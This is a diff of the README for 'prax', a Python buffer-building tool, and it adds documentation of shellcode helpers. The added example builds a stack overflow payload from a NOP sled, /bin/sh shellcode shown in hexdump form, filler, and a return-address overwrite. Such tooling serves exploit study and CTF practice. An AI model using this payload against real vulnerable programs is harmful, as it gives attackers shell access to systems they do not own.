@@ -10,8 +10,19 @@ Prax `eval()`s your input so do not include any untrusted data on the command li
 AAAAAAAAAAefbeadde
 >> prax 'f("README.md")[2:6]'
 Prax
+
 # Simple Buffer overflow example
->> prax '"A"*32 + p(0x0804849d).e(4) | ./vuln
+>> prax --hd 'asm(shl.nop())*40 + asm(shl.sh()) + "A"*47 +i(0xffffce20)'
+00000000  90 90 90 90  90 90 90 90  90 90 90 90  90 90 90 90  │····│····│····│····│
+*
+00000020  90 90 90 90  90 90 90 90  6a 68 68 2f  2f 2f 73 68  │····│····│jhh/│//sh│
+00000030  2f 62 69 6e  89 e3 68 01  01 01 01 81  34 24 72 69  │/bin│··h·│····│4$ri│
+00000040  01 01 31 c9  51 6a 04 59  01 e1 51 89  e1 31 d2 6a  │··1·│Qj·Y│··Q·│·1·j│
+00000050  0b 58 cd 80  41 41 41 41  41 41 41 41  41 41 41 41  │·X··│AAAA│AAAA│AAAA│
+00000060  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
+*
+00000080  41 41 41 20  ce ff ff                               │AAA │···│
+00000087
 ~~~~
 Python operators are implemented as follows:
 
@@ -27,29 +38,47 @@ e1 &/^/\| e2 | bitwise and/xor/or e1 with e2 |
 
 # Usage
 ~~~~
->> prax -h
-usage: prax [-h] [-n] input
+usage: prax [-h] [-n] [-d] [-a ARCH] [--hd] input
 
-A data conversion tool.
+A buffer building and data manipulation tool.
 Manipulate data by converting python builtins (str, int, bytes) to PraxBytes e.g. p(0xdeadbeef)
 Chain conversions and manipulate data using normal operators:
     "A"*10 + h("deadbeef").e().H() -> "AAAAAAAAAAefbeadde"
-    f("README.md")[:6] = "# Prax"
-    
-p(input=)                :  Convert to PraxBytes
-H(input)                 :  Convert to hexadecimal representation
-B(input)                 :  Convert to binary representation
-h(input)                 :  Convert from hexadecimal representation
-e(input, num_bytes=4)    :  Swaps endianness. optional param 'num_bytes'
-f(input)                 :  Reads contents of a file
-stdin()                  :  Reads from stdin
+    f("README.md")[:6] = "# Prax" 
+    asm(shl.nop())*40 + asm(shl.sh()) + "A"*47 + i(0xffffce20) -> 
+        nopsled       +   shellcode   + filler + return addr overwrite
+
+prax.core:
+	p(input=)                :  Convert to PraxBytes
+	h(input)                 :  Convert from hexadecimal representation
+	H(input)                 :  Convert to hexadecimal representation
+	b(input)                 :  Convert from binary representation
+	B(input)                 :  Convert to binary representation
+	e(input, num_bytes=4)    :  Swaps endianness. optional param 'num_bytes'
+	f(input)                 :  Reads contents of a file
+	stdin()                  :  Reads from stdin
+
+prax.shellcode:
+	set_arch(arch)           :  Set the pwnlib architecture (same as -a for cmd tool)
+	binsh(arch=None)         :  assembled binsh shellcode. equivalent to asm(shl.sh())
+	asm(pb, arch=None)       :  Assemble instructions or shellcode according to current arch
+	disasm(pb, arch=None)    :  Disassemble instructions or shellcode according to current arch
+	i(number, word_size=None, endianness=None, sign=None, kwargs):  Pack a word sized value according to the specified arch
+	ui(a, kw)                :  Unpack a word sized value according to the specified arch
+	shl                      :  The shellcode module.
+
+prax.urlmodule:
+	urlenc(pb)               :  Produce a URL safe encoded string
 
 positional arguments:
   input
 
 optional arguments:
-  -h, --help        show this help message and exit
-  -n, --no_newline  Don't add a newline to output.
+  -h, --help            show this help message and exit
+  -n, --no_newline      Don't add a newline to output.
+  -d, --debug           launch idpb when running command
+  -a ARCH, --arch ARCH  set pwnlib architecture
+  --hd                  output as hexdump
 ~~~~
 
 # Install
